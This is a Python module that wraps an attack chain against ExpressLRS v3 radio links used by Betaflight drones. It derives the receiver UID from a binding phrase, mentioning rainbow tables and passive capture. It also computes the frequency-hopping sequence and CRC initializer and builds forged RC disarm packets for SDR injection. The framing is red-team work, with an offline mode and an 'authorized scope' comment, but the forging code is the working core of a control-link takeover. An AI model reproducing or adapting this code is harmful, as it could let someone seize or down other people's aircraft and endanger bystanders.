"""ELRS v3 OTA Injection Capability Pack.

Pack 1 in the Capability Pack registry.  Wraps the existing ELRS chain
components (tools/elrs_core/, tools/exploit_chains/elrs_chain.py) behind the
CapabilityPack ABC defined in capability_pack.py.

Metadata uses real ELRS 2.4 GHz OTA v3 receiver-side injection parameters
derived from the Betaflight 4.4.2 source analysis.  Offline fixture tests
exercise the pack without any hardware, RF, serial, or network access.
"""

from __future__ import annotations

import hashlib
import sys
from pathlib import Path
from typing import Any

# Ensure tools/ is importable (it's already on sys.path in the web app,
# but add it defensively for standalone test runs).
_TOOLS_DIR = str(Path(__file__).resolve().parent.parent / "tools")
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)

from capability_pack import (
    ApplicabilityBoundary,
    CapabilityPack,
    Effect,
    Falsifier,
    HardwareRequirement,
    PackIdentity,
    Prerequisite,
    PrerequisiteMode,
)

# ---------------------------------------------------------------------------
# Wrap ELRS core imports with try/except so the pack can be registered even
# if the full tool chain isn't importable (test fixtures use canned data).
# ---------------------------------------------------------------------------
try:
    from elrs_core.fhss import DOMAINS
    from elrs_core.ota import (
        PACKET_TYPE_RCDATA,
        build_rcdata_std,
        crsf_to_uint10,
        validate_crc,
    )
    from elrs_core.v3_compat import (
        v3_build_sequence,
        v3_uid_crc_init,
        v3_uid_seed,
    )
    _ELRS_CORE_AVAILABLE = True
except ImportError:
    _ELRS_CORE_AVAILABLE = False

try:
    from exploit_chains.elrs_chain import (
        forge_takeover_packets,
        phrase_to_uid,
        uid_to_crc_init,
        uid_to_fhss_seed,
    )
    _ELRS_CHAIN_AVAILABLE = True
except ImportError:
    _ELRS_CHAIN_AVAILABLE = False


# ---------------------------------------------------------------------------
# Standalone helpers (used when elrs_chain is not importable, or for the
# pack's own deterministic path that always uses v3 semantics).
# ---------------------------------------------------------------------------

def _phrase_to_uid(phrase: str) -> bytes:
    """Binding phrase -> 6-byte UID (MD5 of the ELRS build define)."""
    raw = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(raw.encode()).digest()[:6]


def _v3_uid_seed(uid: bytes) -> int:
    """v3 FHSS seed: ((UID[2]<<24)+(UID[3]<<16)+(UID[4]<<8)+UID[5]) ^ 3."""
    if _ELRS_CORE_AVAILABLE:
        return v3_uid_seed(uid)
    return ((uid[2] << 24) + (uid[3] << 16) + (uid[4] << 8) + uid[5]) ^ 3


def _v3_crc_init(uid: bytes) -> int:
    """v3 CRC init: (UID[4]<<8 | UID[5]) ^ 3."""
    if _ELRS_CORE_AVAILABLE:
        return v3_uid_crc_init(uid)
    return ((uid[4] << 8) | uid[5]) ^ 3


def _v3_fhss_sequence(uid: bytes) -> list[int]:
    """Build the v3 FHSS sequence (240 entries for 80-channel 2.4 GHz)."""
    if _ELRS_CORE_AVAILABLE:
        return v3_build_sequence(uid, freq_count=80)
    # Minimal fallback -- should not be reached in practice since elrs_core
    # is always available in this repo.
    raise ImportError("elrs_core not available for FHSS computation")


def _resolve_uid(params: dict[str, Any]) -> bytes:
    """Extract or derive the 6-byte UID from pack parameters."""
    if "target_uid" in params:
        uid_val = params["target_uid"]
        if isinstance(uid_val, bytes):
            return uid_val
        return bytes.fromhex(uid_val)
    if "binding_phrase" in params:
        return _phrase_to_uid(params["binding_phrase"])
    raise ValueError("Either 'binding_phrase' or 'target_uid' must be provided")


def _build_v3_rc_packets(uid: bytes, crc_init: int, fhss_seq: list[int],
                         num_hops: int = 20) -> list[dict[str, Any]]:
    """Build forged RC disarm packets across the FHSS sequence.

    Uses the vendored OTA encoder when available; falls back to the
    elrs_chain forge path otherwise.
    """
    packets: list[dict[str, Any]] = []

    # Disarm channels: centered sticks, throttle low, AUX1 disarm
    channels = [172, 992, 992, 992]  # throttle, roll, pitch, yaw (CRSF scale)

    domain = DOMAINS["ISM2G4"] if _ELRS_CORE_AVAILABLE else None

    for hop_idx in range(min(len(fhss_seq), num_hops)):
        ch = fhss_seq[hop_idx]

        if _ELRS_CORE_AVAILABLE:
            # v3 hybrid mode: nonce is NOT XOR'd into CRC (use ota_nonce=0)
            pkt_bytes = build_rcdata_std(
                channels,
                switch_index=0,
                switch_value=0,
                is_armed=False,
                crc_init=crc_init,
                ota_nonce=0,
            )
            freq_mhz = domain.channel_freq(ch) / 1e6 if domain else 0.0
        else:
            pkt_bytes = b"\x00" * 8
            freq_mhz = 0.0

        packets.append({
            "hop_index": hop_idx,
            "channel": ch,
            "freq_mhz": freq_mhz,
            "data_hex": pkt_bytes.hex(),
            "ota_nonce": 0,
        })

    return packets


# ---------------------------------------------------------------------------
# The Capability Pack
# ---------------------------------------------------------------------------

class ELRSv3OTAInjectionPack(CapabilityPack):
    """ELRS v3 OTA RC injection pack for 2.4 GHz SX1280 receivers.

    Wraps the existing ELRS chain components behind the CapabilityPack ABC.
    All metadata uses real values from the Betaflight 4.4.2 source analysis
    and the measured OTA v3 parameters.
    """

    # -- Metadata properties (frozen dataclasses) --

    @property
    def identity(self) -> PackIdentity:
        return PackIdentity(
            name="ELRS v3 OTA Injection",
            version="0.1.0",
            description=(
                "Forge and inject ELRS OTA v3 RC channel packets to override "
                "receiver control inputs on a 2.4 GHz SX1280 SPI target running "
                "Betaflight 4.4.2"
            ),
        )

    @property
    def applicability(self) -> ApplicabilityBoundary:
        return ApplicabilityBoundary(
            protocol_version="ELRS v3 OTA",
            phy_domain="2.4 GHz LoRa SX1280",
            firmware_impl="Betaflight",
            firmware_version="4.4.2",
            configuration={
                "ota_version": 3,
                "channel_count": 80,
                "sync_channel": 41,
                "packet_size_bytes": 8,
                "crc_bits": 14,
                "crc_poly": "0x2E57",
                "fhss_sequence_len": 240,
            },
            prerequisite_knowledge=[
                "Complete 6-byte UID (from binding phrase, passive SYNC capture, "
                "or rainbow table lookup)",
                "OTA version confirmed as v3 (not v4)",
            ],
            access_conditions=[
                "RF line-of-sight to target within SDR TX range",
                "2.4 GHz ISM band, LoRa modulation",
            ],
        )

    @property
    def prerequisites(self) -> list[Prerequisite]:
        return [
            Prerequisite(
                name="binding_phrase",
                mode=PrerequisiteMode.OPERATOR_SUPPLIED,
                description=(
                    "ELRS binding phrase string; derives the 6-byte UID via MD5. "
                    "Source: operator knowledge, rainbow table, or OSINT."
                ),
            ),
            Prerequisite(
                name="target_uid",
                mode=PrerequisiteMode.DERIVED,
                description=(
                    "Complete 6-byte UID. Can be operator-supplied, derived from "
                    "binding phrase, or wirelessly acquired from passive SYNC capture. "
                    "Mode depends on how it was obtained."
                ),
            ),
        ]

    @property
    def effects(self) -> list[Effect]:
        return [
            Effect(
                name="rc_override",
                destructive=False,
                description=(
                    "Override RC channel inputs on the target receiver. Sends forged "
                    "RC packets with disarm command (throttle low, AUX1 disarm) "
                    "across the FHSS hop sequence. Non-destructive: the legitimate "
                    "TX can re-acquire the link."
                ),
            ),
        ]

    @property
    def hardware_requirements(self) -> list[HardwareRequirement]:
        return [
            HardwareRequirement(
                name="Ettus B205mini",
                description=(
                    "Ettus Research B205mini SDR transceiver with UHD driver. "
                    "Single TX/RX, 56 MHz BW. Sufficient for single-channel "
                    "LoRa injection on 2.4 GHz."
                ),
            ),
            HardwareRequirement(
                name="Ettus B210",
                description=(
                    "Ettus Research B210 SDR transceiver with UHD driver. "
                    "Full-duplex 2x2 MIMO, 56 MHz BW. Supports simultaneous "
                    "monitoring and injection."
                ),
            ),
        ]

    @property
    def falsifiers(self) -> list[Falsifier]:
        return [
            Falsifier(
                description="Receiver rejects forged RC packet despite correct UID",
                condition=(
                    "CRC-14 mismatch: the v3 CRC initializer or nonce model "
                    "differs from the source-derived expectation"
                ),
            ),
            Falsifier(
                description="Receiver ignores injection on the correct FHSS channel",
                condition=(
                    "FHSS sequence desynchronization: the v3 sync channel "
                    "formula or LCG seed does not match the live receiver"
                ),
            ),
            Falsifier(
                description="Receiver is running a different OTA version",
                condition=(
                    "OTA version mismatch: target uses v4 (or later) which "
                    "changes CRC init shift, nonce XOR, and SYNC structure"
                ),
            ),
        ]

    # -- Lifecycle methods --

    def preview(self, params: dict[str, Any]) -> dict[str, Any]:
        """Derive all injection parameters and build packet plan.

        No hardware access.  Returns the full chain plan: UID, FHSS seed,
        CRC init, hop sequence, and forged packets.
        """
        uid = _resolve_uid(params)
        seed = _v3_uid_seed(uid)
        crc_init = _v3_crc_init(uid)
        fhss_seq = _v3_fhss_sequence(uid)
        packets = _build_v3_rc_packets(uid, crc_init, fhss_seq)

        return {
            "description": (
                "ELRS v3 OTA RC injection: forged disarm packets across "
                f"{len(fhss_seq)}-hop FHSS sequence"
            ),
            "uid_hex": uid.hex(),
            "fhss_seed": seed,
            "crc_init": crc_init,
            "sync_channel": 41,
            "fhss_sequence": fhss_seq,
            "packets": packets,
            "ota_version": 3,
            "requires_hardware": False,
        }

    def arm(self, params: dict[str, Any]) -> dict[str, Any]:
        """Prepare for injection.  Validates parameters but does not transmit."""
        uid = _resolve_uid(params)
        seed = _v3_uid_seed(uid)
        crc_init = _v3_crc_init(uid)

        return {
            "armed": True,
            "uid_hex": uid.hex(),
            "fhss_seed": seed,
            "crc_init": crc_init,
            "ota_version": 3,
        }

    def execute(self, params: dict[str, Any]) -> dict[str, Any]:
        """Execute the injection chain.

        In offline / fixture mode, this builds the packet plan without
        transmitting.  Live execution requires SDR hardware and a
        separately authorized scope.
        """
        uid = _resolve_uid(params)
        crc_init = _v3_crc_init(uid)
        fhss_seq = _v3_fhss_sequence(uid)
        packets = _build_v3_rc_packets(uid, crc_init, fhss_seq)

        return {
            "result_state": "attempted",
            "packets_built": len(packets),
            "uid_hex": uid.hex(),
            "transmitted": False,
            "reason": "offline mode -- no SDR hardware",
        }

    def verify(self, params: dict[str, Any]) -> dict[str, Any]:
        """Verify injection effect.  Offline: reports candidate evidence."""
        return {
            "result_state": "previewed",
            "evidence_level": "offline_validated",
            "notes": (
                "Offline verification: packet CRC and FHSS sequence are "
                "source-derived correct for v3. Bench validation requires "
                "live RF and a separately authorized scope."
            ),
        }

    def stop(self) -> dict[str, Any]:
        """Stop any active injection.  No-op in offline mode."""
        return {
            "stopped": True,
            "reason": "offline mode -- nothing to stop",
        }
